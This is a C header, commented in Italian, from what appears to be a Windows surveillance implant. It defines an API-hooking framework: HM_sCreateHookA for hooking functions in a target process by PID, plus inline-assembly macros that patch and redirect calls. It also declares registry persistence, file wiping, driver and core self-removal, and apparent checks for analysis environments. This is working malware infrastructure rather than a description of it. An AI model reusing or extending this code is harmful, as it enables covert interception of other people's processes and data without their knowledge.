#include <windows.h>
#include <Winioctl.h>
#include "HM_SafeProcedures.h"

#define STUB_SIZE 24
#define REDIR_SIZE 5
#define MARK_SEARCH_LIMIT 20 // Numero di byte in cui cerca il marker di un hook
#define HMINBUNDLEHOOKS 0
#define MAXVIRTUALHOOK 1
#define HMSCREATEHOOK "HM_sCreateHookA"
#define IFDEF(x) if(x != NULL)
#define VALIDPTR(x)	if(!(x)) return 1;

// Usata per HM_GetDate
typedef struct {
	DWORD lo_delay; 
	DWORD hi_delay; 
} NANOSEC_TIME; 

// Funzioni esportate
extern void HM_InsertRegistryKey(char *, BOOL);
char *HM_CompletePath(const char *, char *);
WCHAR *HM_CompletePathW(const WCHAR *, WCHAR *);

void HM_WipeFileA(LPCSTR lpFileName);
void HM_WipeFileW(LPCWSTR lpFileName);

extern void HM_RemoveRegistryKey(void);
extern void HM_RemoveDriver();
extern void HM_RemoveCore(void);
extern BOOL HM_GetDefaultBrowser(char *);
extern BOOL HM_GetIE32Browser(char *path_name);

extern BOOL HM_CheckNewConf(char *);
extern BOOL HM_GetDate(NANOSEC_TIME *);
extern char *HM_ReadClearConf(char *);
extern BOOL HM_ExpandStrings(char *source, char *dest, DWORD dsize);
extern BOOL HM_ExpandStringsW(WCHAR *source, WCHAR *dest, DWORD dsize);
extern BOOL GetUserUniqueHash(BYTE *user_hash, DWORD hash_size);
extern void IndirectCreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, BOOL inherit);
extern void HM_CalcDateDelta(long long, NANOSEC_TIME *);
void *memmem (const void *haystack, size_t haystack_len, const void *needle, size_t needle_len);
extern BOOL HM_TimeStringToFileTime(const char *time_string, FILETIME *ftime);
extern BOOL IsLastInstance();
extern BOOL HM_HourStringToMillisecond(const char *time_string, DWORD *millisecond);

BOOL FindModulePath(char *, DWORD);
char *GetDosAsciiName(WCHAR *orig_path);


// Dichiarata in HM_CrisisAgent.h 
extern BOOL IsCrisisNetwork(void);
extern BOOL IsCrisisSystem(void);

// Viene usata anche dagli event handlers delle date
extern NANOSEC_TIME date_delta; // Usato per eventuali aggiustamenti sulla lettura delle date

// Tpi delle funzioni importate dinamicamente.....
//
typedef BOOL		(WINAPI *FreeLibrary_T) (HMODULE);
typedef FARPROC		(WINAPI *GetProcAddress_T) (HMODULE, LPCSTR);
typedef HINSTANCE	(WINAPI *LoadLibrary_T) (LPCTSTR);
typedef DWORD		(WINAPI *ResumeThread_T)(HANDLE);
typedef HANDLE		(WINAPI *OpenThread_T)(DWORD,BOOL,DWORD);
typedef BOOL		(WINAPI *CloseHandle_T)(HANDLE);
typedef int			(WINAPI *atoi_t) (const char *);
typedef void		(WINAPI *memcpy_t)(void *,const void *,size_t);


/////////////////////////////////////////////////////////////////
//
// Strutture Globali
//
/////////////////////////////////////////////////////////////////


//
// Services struct 
//
typedef BOOL	(WINAPI *HM_IPCClientWrite_t) (DWORD, BYTE *, DWORD, DWORD, DWORD);
typedef BYTE *	(WINAPI *HM_IPCClientRead_t) (DWORD);
typedef DWORD	(WINAPI *HM_sCreateHook_t) (DWORD,char*,char*,BYTE*,DWORD,BYTE*,DWORD);
typedef HANDLE  (WINAPI *HM_sStartHookingThread_t)(DWORD,DWORD,BOOL,BOOL);

typedef struct {
	HM_IPCClientWrite_t pHM_IpcCliWrite;
	HM_IPCClientRead_t  pHM_IpcCliRead;
	DWORD PARAM[10];
}HMServiceStruct;

//
// struct comune di ogni datastruct degli Hook 
// [HMCommonDataStruct pCommon]

/*COMMONDATA
 *	char OriginalCode[STUB_SIZE];		// Stub che contiene il primo pezzo dell'Api
 *	DWORD dwHookLen;					// Lunghezza dell'Hook
 *	DWORD dwHookAdd;					// Indirizzo dell'Hook 
 *	DWORD dwDataAdd; 					// Indirizzo dei dati utiilzzati dall'Hook
 *	BYTE *bAPIAdd;						// Indirizzo API da Hookare
 *	GetProcAddress_T _GetProcAddress;
 *	LoadLibrary_T _LoadLibrary
 *  FreeLibrary_T _FreeLibrary
 */

#define COMMONDATA	char OriginalCode[STUB_SIZE];DWORD dwHookLen;DWORD dwHookAdd;DWORD dwDataAdd;BYTE *bAPIAdd;GetProcAddress_T _GetProcAddress;LoadLibrary_T _LoadLibrary;FreeLibrary_T _FreeLibrary;HM_IPCClientWrite_t pHM_IpcCliWrite;HM_IPCClientRead_t  pHM_IpcCliRead
typedef struct {COMMONDATA;} HMCommonDataStruct;

void WINAPI HM_CreateProcess(char *, DWORD, STARTUPINFO *, PROCESS_INFORMATION *, DWORD);
void WINAPI HM_CreateProcessAsUser(char *, DWORD, STARTUPINFO *, PROCESS_INFORMATION *, DWORD, HANDLE);

////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////
//
// Definizioni macro per gli Hooks
//
////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////
DWORD WINAPI HM_sCreateHookA(DWORD dwPid,
	char* APIName,
	char* DLLAPIName,
	BYTE* HookAdd,
	DWORD HookSize,
	BYTE* HookData,
	DWORD HookDataSize);

typedef DWORD (WINAPI *HM_CreateHook_t)(DWORD, HMServiceStruct *, BOOL);
typedef DWORD (WINAPI *HM_CreateService_t)(DWORD, HMServiceStruct *);

// Indispensabili per gli Hooks
#define INIT_WRAPPER(STRTYPE)			STRTYPE *pData = NULL; \
										__asm    MOV EBX,69696969h \
										__asm	 MOV DWORD PTR SS:[pData], EBX \

// Marca gli hook con delle jump all'istruzione successiva
#define MARK_HOOK						__asm	_emit 0xEB \
										__asm	_emit 0x00 \
										__asm	_emit 0xEB \
										__asm	_emit 0x00 

#define CALL_ORIGINAL_API(ARGS_N) 	    DWORD ret_code = 0; \
										__asm	 MOV EBX, DWORD PTR SS:[pData] \
										__asm	 LEA ESI, DWORD PTR SS:[EBP+8] \
										__asm	 MOV EDI, ARGS_N \
										__asm	 SHL EDI, 2 \
										__asm	 SUB ESP, EDI \
										__asm    MOV EDI, ESP \
										__asm	 MOV ECX, ARGS_N \
										__asm	 REP MOVSD \
										__asm    CALL EBX \
										__asm	 MOV DWORD PTR SS:[ret_code], EAX 

#define CALL_ORIGINAL_API_SEQ(ARGS_N) 	__asm	 MOV EBX, DWORD PTR SS:[pData] \
										__asm	 LEA ESI, DWORD PTR SS:[EBP+8] \
										__asm	 MOV EDI, ARGS_N \
										__asm	 SHL EDI, 2 \
										__asm	 SUB ESP, EDI \
										__asm    MOV EDI, ESP \
										__asm	 MOV ECX, ARGS_N \
										__asm	 REP MOVSD \
										__asm    CALL EBX \
										__asm	 MOV DWORD PTR SS:[ret_code], EAX 

#define IF_WSTRCMP(x,y) BOOLEAN is_equal;\
	                    is_equal = TRUE;\
			  		    if (x) {\
							DWORD i = 0;\
							do {\
								if (x[i*2] != pData->y[i]) {\
									is_equal = FALSE;\
									break;\
								}\
							} while (pData->y[i++]);\
					    } else is_equal = FALSE;\
                        if (is_equal)

#define IF_LSTRCMP(x,y,z) BOOLEAN is_equal;\
	                      is_equal = TRUE;\
			  		      if (x) {\
							DWORD i = 0;\
							while(pData->y[i]) {\
								if (i>=z) { \
									is_equal = FALSE;\
									break;\
								} \
								if (x[i*2] != pData->y[i]) {\
									is_equal = FALSE;\
									break;\
								}\
								i++; \
							}\
							if (i!=z) is_equal = FALSE; \
					      } else is_equal = FALSE;\
                          if (is_equal)

#define HMMAKE_HOOK(DWPID, APINAME, HOOKADD, HOOKDATA, SETUPADD, OPTPARAM, DLLNAME)	(SETUPADD(OPTPARAM) ? 0 : \
																				HM_sCreateHookA(DWPID, APINAME, DLLNAME, (BYTE *)HOOKADD, HOOKDATA.dwHookLen, (BYTE *)&HOOKDATA, sizeof(HOOKDATA))); 
																		
																		
HANDLE GetMediumLevelToken();